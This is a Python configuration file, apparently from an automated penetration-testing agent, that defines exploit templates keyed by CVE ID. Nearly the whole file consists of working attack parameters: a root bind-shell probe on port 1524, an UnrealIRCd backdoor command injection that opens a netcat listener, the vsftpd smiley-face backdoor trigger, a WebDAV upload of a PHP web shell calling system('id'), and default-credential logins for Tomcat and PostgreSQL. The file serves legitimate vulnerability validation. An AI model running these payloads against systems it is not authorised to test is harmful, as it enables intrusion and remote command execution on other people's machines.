"""
Defines the deterministic execution parameters for specific vulnerabilities.
These are the blueprints the agent uses to prove a CVE is exploitable.
"""
"""
========================================================================
ATTACK TEMPLATE MANIFEST
========================================================================
HOW TO ADD A NEW ATTACK:
1. The KEY must be the exact CVE ID (or standardized custom ID like 'CVE-DEFAULT-POSTGRES').
2. 'category': Must be 'active_exploit' or 'safe_check'.
3. 'executor': Must match a block in attack.py (e.g., 'socket_send', 'http_request').
4. 'params': The exact variables needed by the executor.
5. 'validation': The rule validator.py will use to prove success.

to push changes to the database simply do docker-compose up --build -d 
as the backedn has  python scripts/seed_postgres.py command attached 
========================================================================
"""

MASTER_TEMPLATES = {
    "CVE-1994-0134": {
        "category": "active_exploit",
        "service": "ingreslock",
        "executor": "socket_send", 
        "description": "Checks for an unauthenticated root bind shell on port 1524. This grants immediate OS-level control.",
        "params": {"port": 1524, "payload": "id\n", "timeout": 5, "delay": 1},
        "validation": {"type": "regex", "pattern": r"uid=0\(root\)"}
    },
    
    "CVE-2010-2075": {
        "category": "active_exploit",
        "service": "irc",
        "executor": "socket_blind_rce",
        "description": "Exploits a Trojan Horse backdoor (CVE-2010-2075) in UnrealIRCd.",
        "params": {"port": 6667, "payload": "AB; nohup sh -c 'id | nc -l -p 4444' &\n", "harvest_port": 4444, "timeout": 5, "delay": 1},
        "validation": {"type": "regex", "pattern": r"uid=\d+"}
    },
    
    "CVE-2011-2523": {
        "category": "active_exploit",
        "service": "ftp",
        "executor": "socket_trigger_and_connect", 
        "description": "Triggers the CVE-2011-2523 vsftpd smiley face backdoor on port 21.",
        "params": {"port": 21, "trigger_payload": "USER backdoored:)\r\nPASS pass\r\n", "shell_port": 6200, "shell_payload": "id\n", "timeout": 5, "delay": 1},
        "validation": {"type": "regex", "pattern": r"uid=0\(root\)"}
    },
    
    "CVE-1999-0502": {
        "category": "active_exploit",
        "service": "http",
        "executor": "http_request",
        "description": "Attempts to authenticate to Tomcat Manager using default credentials.",
        "params": {"method": "GET", "port": 8180, "path": "/manager/html", "auth": ["tomcat", "tomcat"], "timeout": 5},
        "validation": {"type": "status_code", "expected": 200}
    },
    
    "CVE-2006-1348": {
        "category": "active_exploit",
        "service": "http",
        "executor": "http_put_and_get",
        "description": "Exploits unauthenticated WebDAV access.",
        "params": {"port": 80, "put_path": "/dav/agent_shell.php", "payload": "<?php echo \"VULNERABLE_SYSTEM_CONFIRMED\\n\"; system('id'); ?>", "timeout": 5},
        "validation": {"type": "body_contains", "expected": "VULNERABLE_SYSTEM_CONFIRMED"}
    },  
    
    "CVE-DEFAULT-POSTGRES": {
        "category": "active_exploit",
        "service": "postgresql",
        "executor": "postgres_login",
        "description": "Attempts to log into PostgreSQL using default superuser credentials.",
        "params": {"port": 5432, "user": "postgres", "password": "postgres", "database": "template1", "query": "SELECT current_user;", "timeout": 5},
        "validation": {"type": "exact_match", "expected": "postgres"}
    }
}